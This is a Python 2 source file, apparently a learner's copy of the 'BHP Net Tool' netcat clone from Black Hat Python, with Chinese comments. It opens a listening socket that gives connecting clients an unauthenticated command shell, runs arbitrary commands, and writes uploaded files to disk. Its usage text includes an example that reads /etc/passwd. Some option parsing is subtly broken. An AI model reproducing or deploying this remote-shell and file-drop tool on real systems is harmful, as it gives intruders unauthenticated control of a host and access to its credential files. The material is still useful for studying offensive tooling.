#coding=utf-8
import sys
import socket
import getopt
import threading
import subprocess

# python2 bhpnet.py -l -p 9999 -c          # 服务端
# python2 bhpnet.py -t localhost -p 9999   # 客户端

# global var
listen = False
command = False
upload = ""
execute = ""
target = ""
upload_destination = ""
port = 0
def usage():
    print("BHP Net Tool")
    print("")
    print("Usage: hbpnet.py -t target_host -p port")
    print("-l --listen              - listion on [host]:[port] for incoming connections")                   # 听
    print("-e --execute=file_to_run - execute the given file upon receiving a connection")                  # 执行
    print("-c --command             - initialize a command shell")                                          # 命令行
    print("-u --upload=destination  - upon receiving connection upload a file and write to [destination]")  # 上传到的文件
    print("")
    print("")
    print("Examples:")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -c")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target\exe")
    print("bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"")
    sys.exit(0)

# 服务端逻辑
def server_loop():
    """ 服务端 """
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((target, port))
    server.listen(5)
    while True:
        client_socket, addr = server.accept()
        client_thread = threading.Thread(target=client_handler, args=(client_socket, )) # 多线程
        client_thread.start()

def client_handler(client_socket):
    """ 服务端处理逻辑 """
    global upload
    global execute
    global command
    # 检测上传文件
    if len(upload_destination):
        # 读取所有的字符并写下目标
        file_buffer = ""
        while True:
            data = client_socket.recv(1024)
            if data:
                file_buffer += data
            else:
                break

        try:
            file_descriptor = open(upload_destination, "wb")
            file_descriptor.write(file_buffer)
            file_descriptor.close()
            client_socket.send("Successfully saved file to %s\r\n" % upload_destination)
        except:
            client_socket.send("Failed to save file to %s\r\n" % upload_destination)
    if len(execute):
        output = run_command(execute) # 执行命令
        client_socket.send(output) # 发送结果
    if command: # 命令行
        while True:
            # 跳出一个窗口
            # client_socket.send("<BHP:#> ") # 发送给客户端
            # 输入直到换行
            cmd_buffer = ""
            while "\n" not in cmd_buffer:
                cmd_buffer += client_socket.recv(1024)
            response = run_command(cmd_buffer)
            client_socket.send(str(response))

def run_command(command):
    """ 执行命令 """
    command = command.rstrip()
    # 客户端运行命令并将输出返回
    print(">>>> " + command)
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
    except:
        output = "Failed to execute command.\r\n"
    # 将输出发送
    return output

# 客户端逻辑
def client_sender(buffer):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((target, port))
        if len(buffer):
            client.send(buffer)
        while True:
            # 分片读
            recv_len = 1
            response = ""
            while recv_len:
                data = client.recv(4096)
                recv_len = len(data)
                response += data
                if recv_len < 4096:
                    break
            print(response)
            #
            buffer = raw_input("<BHP:#> ")
            buffer += "\n"
            #
            client.send(buffer)
    except:
        print("[*] Exception! Existion.")
        client.close()


# 入口
def main():
    global listen
    global port
    global execute
    global command
    global upload_destination
    global target
    if not len(sys.argv[:1]):
        usage()
    try:
        opts, args = getopt.getopt(sys.argv[1:], "hle:t:p:cu",
                                   ["help", "listen", "execute", "target", "port", "command", "upload"])
    except getopt.GetoptError as err:
        print(str(err))
        usage()
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o in ("-l", "--listen"):
            listen = True
        elif o in ("e", "--execute"):
            execute = a
        elif o in ("-c", "--commandshell"):
            command = True
        elif o in ("-u", "--upload"):
            upload_destination = a
        elif o in ("-t", "--target"):
            target = a
        elif o in ("-p", "--port"):
            port = int(a)
        else:
            assert False, "Unhandled Option"
    # 客户端
    if not listen and len(target) and port>0:
        """
        标准输入读取数据、发送数据
        """
        # buffer = sys.stdin.read() #
        buffer = raw_input("<BHP:#> ")
        client_sender(buffer+"\n") # 发送给服务端
    # 服务端
    if listen:
        """
        监听
        """
        if not len(target):
            target = "0.0.0.0"
        server_loop()

main()
